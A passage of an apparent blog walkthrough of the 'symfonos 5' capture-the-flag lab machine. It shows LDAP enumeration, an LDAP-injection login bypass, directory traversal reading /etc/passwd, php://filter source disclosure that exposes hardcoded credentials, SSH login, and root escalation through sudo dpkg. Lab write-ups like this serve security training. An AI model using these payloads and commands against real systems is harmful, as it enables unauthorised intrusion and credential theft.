&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nmap -p 389,636 --script ldap-* 192.168.191.132 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos5/symfonos5-2.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;&lt;strong&gt;ldapsearch&lt;/strong&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;ldapsearch -h 192.168.191.132 -D &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; -w &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; -b &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;DC=symfonos,DC=local&amp;#34;&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos5/symfonos5-3.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h2 id=&#34;80-http&#34;&gt;80 (HTTP)&lt;/h2&gt;
&lt;p&gt;Opening the site on the browser, we only get a plain page with an image.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos5/symfonos5-4.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Performing a directory/file bruteforce using ffuf, we discover new files.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;ffuf -ic -c -u http://192.168.191.132/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e /,.php,.html -t &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt; | tee root.ffuf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos5/symfonos5-1.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Accessing /home.php we are redirected to admin.php which has a login form.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos5/symfonos5-5.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;I tried out credential bruteforce and sql injection auth bypass techniques but none of them were successful. I
then thought to try out ldap injection. Since we have ldap running on this host it could be a valid path.&lt;/p&gt;
&lt;p&gt;The application performs authentication insecurely by using GET requests to login.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos5/symfonos5-6.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Setting the username and password to &lt;code&gt;*&lt;/code&gt; we successfully login.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos5/symfonos5-7.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;We get redirected to home.php which doesn&amp;rsquo;t have much, but clicking on portraits we see interesting functionality.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos5/symfonos5-8.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;The url parameter takes in a url, changing the input to &lt;code&gt;../../../../etc/passwd&lt;/code&gt; we can read the passwd file. This confirms
we can abuse LFI to access other files on disk by directory traversal.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos5/symfonos5-9.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;I tried accessing log files to try for RCE like the previous boxes but nothing came up. We can still use this to read
files so we can check the source code of the app.&lt;/p&gt;
&lt;p&gt;Accessing the php files directly just executes them, so we need to use php wrappers.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;home.php&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://192.168.191.132/home.php?url=php://filter/convert.base64-encode/resource=home.php
&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;session_start&lt;/span&gt;();

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;($_SESSION[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;loggedin&amp;#39;&lt;/span&gt;])){
        &lt;span style=&#34;color:#a6e22e&#34;&gt;header&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Location: admin.php&amp;#34;&lt;/span&gt;);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;exit&lt;/span&gt;;
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;empty&lt;/span&gt;($_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;url&amp;#34;&lt;/span&gt;]))
{
$r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;url&amp;#34;&lt;/span&gt;];
$result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;file_get_contents&lt;/span&gt;($r);
}

&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;html&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;head&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;link rel=&amp;#34;stylesheet&amp;#34; type=&amp;#34;text/css&amp;#34; href=&amp;#34;/static/bootstrap.min.css&amp;#34;&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;/head&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;body&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;nav class=&amp;#34;navbar navbar-expand-lg navbar-dark bg-dark&amp;#34;&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  &amp;lt;a class=&amp;#34;navbar-brand&amp;#34; href=&amp;#34;home.php&amp;#34;&amp;gt;symfonos&amp;lt;/a&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  &amp;lt;button class=&amp;#34;navbar-toggler&amp;#34; type=&amp;#34;button&amp;#34; data-toggle=&amp;#34;collapse&amp;#34; data-target=&amp;#34;#navbarColor02&amp;#34; aria-controls=&amp;#34;navbarColor02&amp;#34; aria-expanded=&amp;#34;false&amp;#34; aria-label=&amp;#34;Toggle navigation&amp;#34;&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;    &amp;lt;span class=&amp;#34;navbar-toggler-icon&amp;#34;&amp;gt;&amp;lt;/span&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  &amp;lt;/button&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  &amp;lt;div class=&amp;#34;collapse navbar-collapse&amp;#34; id=&amp;#34;navbarColor02&amp;#34;&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;    &amp;lt;ul class=&amp;#34;navbar-nav mr-auto&amp;#34;&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      &amp;lt;li class=&amp;#34;nav-item&amp;#34;&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;        &amp;lt;a class=&amp;#34;nav-link&amp;#34; href=&amp;#34;home.php&amp;#34;&amp;gt;Home&amp;lt;/a&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      &amp;lt;/li&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      &amp;lt;li class=&amp;#34;nav-item&amp;#34;&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;        &amp;lt;a class=&amp;#34;nav-link&amp;#34; href=&amp;#34;home.php?url=http://127.0.0.1/portraits.php&amp;#34;&amp;gt;Portraits&amp;lt;/a&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      &amp;lt;/li&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      &amp;lt;li class=&amp;#34;nav-item&amp;#34;&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;        &amp;lt;a class=&amp;#34;nav-link&amp;#34; href=&amp;#34;logout.php&amp;#34;&amp;gt;Logout&amp;lt;/a&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      &amp;lt;/li&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;    &amp;lt;/ul&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;/nav&amp;gt;&amp;lt;br /&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;center&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;?php
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;if ($result){
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;echo $result;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;} else {
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;echo &amp;#34;&amp;lt;h3&amp;gt;Under Developement&amp;lt;/h3&amp;gt;&amp;#34;;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;} ?&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;/center&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;/body&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;admin.php&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://192.168.191.132/home.php?url=php://filter/convert.base64-encode/resource=admin.php
&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;session_start&lt;/span&gt;();

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;($_SESSION[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;loggedin&amp;#34;&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; $_SESSION[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;loggedin&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;===&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;){
    &lt;span style=&#34;color:#a6e22e&#34;&gt;header&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;location: home.php&amp;#34;&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;exit&lt;/span&gt;;
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;authLdap&lt;/span&gt;($username, $password) {
  $ldap_ch &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ldap_connect&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ldap://172.18.0.22&amp;#34;&lt;/span&gt;);

  &lt;span style=&#34;color:#a6e22e&#34;&gt;ldap_set_option&lt;/span&gt;($ldap_ch, &lt;span style=&#34;color:#a6e22e&#34;&gt;LDAP_OPT_PROTOCOL_VERSION&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;);

  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;$ldap_ch) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;FALSE&lt;/span&gt;;
  }

  $bind &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ldap_bind&lt;/span&gt;($ldap_ch, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cn=admin,dc=symfonos,dc=local&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;qMDdyZh3cT6eeAWD&amp;#34;&lt;/span&gt;);

  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;$bind) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;FALSE&lt;/span&gt;;
  }

  $filter &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;(&amp;amp;(uid=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$username&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;)(userPassword=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$password&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;))&amp;#34;&lt;/span&gt;;
  $result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ldap_search&lt;/span&gt;($ldap_ch, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dc=symfonos,dc=local&amp;#34;&lt;/span&gt;, $filter);

  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;$result) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;FALSE&lt;/span&gt;;
  }

  $info &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ldap_get_entries&lt;/span&gt;($ldap_ch, $result);

  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;($info) &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; ($info[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;count&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;FALSE&lt;/span&gt;;
  }

  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;TRUE&lt;/span&gt;;

}

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;($_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;username&amp;#39;&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;($_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt;])){

$username &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;urldecode&lt;/span&gt;($_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;username&amp;#39;&lt;/span&gt;]);
$password &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;urldecode&lt;/span&gt;($_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt;]);

$bIsAuth &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;authLdap&lt;/span&gt;($username, $password);

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt; $bIsAuth ) {
        $msg &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Invalid login&amp;#34;&lt;/span&gt;;
} &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
        $_SESSION[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;loggedin&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;;
        &lt;span style=&#34;color:#a6e22e&#34;&gt;header&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;location: home.php&amp;#34;&lt;/span&gt;);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;exit&lt;/span&gt;;
}
}
&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;html&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;head&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;link rel=&amp;#34;stylesheet&amp;#34; type=&amp;#34;text/css&amp;#34; href=&amp;#34;/static/bootstrap.min.css&amp;#34;&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;/head&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;body&amp;gt;&amp;lt;br /&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;div class=&amp;#34;container&amp;#34;&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  &amp;lt;div class=&amp;#34;row justify-content-center&amp;#34;&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;    &amp;lt;div class=&amp;#34;col-md-8&amp;#34;&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      &amp;lt;div class=&amp;#34;card&amp;#34;&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;        &amp;lt;div class=&amp;#34;card-header&amp;#34;&amp;gt;Login&amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;        &amp;lt;div class=&amp;#34;card-body&amp;#34;&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          &amp;lt;form action=&amp;#34;admin.php&amp;#34; method=&amp;#34;GET&amp;#34;&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;            &amp;lt;div class=&amp;#34;form-group row&amp;#34;&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;                &amp;lt;label for=&amp;#34;email_address&amp;#34; class=&amp;#34;col-md-4 col-form-label text-md-right&amp;#34;&amp;gt;Username&amp;lt;/label&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;                &amp;lt;div class=&amp;#34;col-md-6&amp;#34;&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;                    &amp;lt;input type=&amp;#34;text&amp;#34; id=&amp;#34;username&amp;#34; class=&amp;#34;form-control&amp;#34; name=&amp;#34;username&amp;#34; required autofocus&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;                &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;            &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;            &amp;lt;div class=&amp;#34;form-group row&amp;#34;&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;                &amp;lt;label for=&amp;#34;password&amp;#34; class=&amp;#34;col-md-4 col-form-label text-md-right&amp;#34;&amp;gt;Password&amp;lt;/label&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;                &amp;lt;div class=&amp;#34;col-md-6&amp;#34;&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;                    &amp;lt;input type=&amp;#34;password&amp;#34; id=&amp;#34;password&amp;#34; class=&amp;#34;form-control&amp;#34; name=&amp;#34;password&amp;#34; required&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;                &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;            &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;            &amp;lt;div class=&amp;#34;col-md-6 offset-md-4&amp;#34;&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;                &amp;lt;button type=&amp;#34;submit&amp;#34; class=&amp;#34;btn btn-primary&amp;#34;&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;                    Login
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;                &amp;lt;/button&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;            &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          &amp;lt;/form&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;        &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  &amp;lt;center&amp;gt;&amp;lt;strong&amp;gt;&amp;lt;?php echo $msg; ?&amp;gt;&amp;lt;/strong&amp;gt;&amp;lt;/center&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;/body&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;/html&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From admin.php we get credentials that can be used on ldap.&lt;/p&gt;
&lt;h1 id=&#34;getting-shell-as-zeus&#34;&gt;Getting shell as zeus&lt;/h1&gt;
&lt;p&gt;With the credentials admin:qMDdyZh3cT6eeAWD, we get more output from ldap:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;ldapsearch -x -h 192.168.191.132 -D &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;CN=admin,DC=symfonos,DC=local&amp;#34;&lt;/span&gt; -w qMDdyZh3cT6eeAWD -b &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;DC=symfonos,DC=local&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos5/symfonos5-10.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;From the output, the userPassword is base64 encoded. After decoding it we get &lt;code&gt;cetkKf4wCuHC9FET&lt;/code&gt; and can login
as zeus via ssh.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos5/symfonos5-11.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h1 id=&#34;privilege-escalation&#34;&gt;Privilege Escalation&lt;/h1&gt;
&lt;p&gt;Running &lt;code&gt;sudo -l&lt;/code&gt;, we see that zeus has sudo permissions to run dpkg with no password.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos5/symfonos5-12.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;From &lt;a href=&#34;https://gtfobins.github.io/gtfobins/dpkg/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;gtfobins&lt;/a&gt;

 we only need to execute the below commands to
abuse this.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;sudo dpkg -l
!/bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos5/symfonos5-13.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h1 id=&#34;extras&#34;&gt;Extras&lt;/h1&gt;
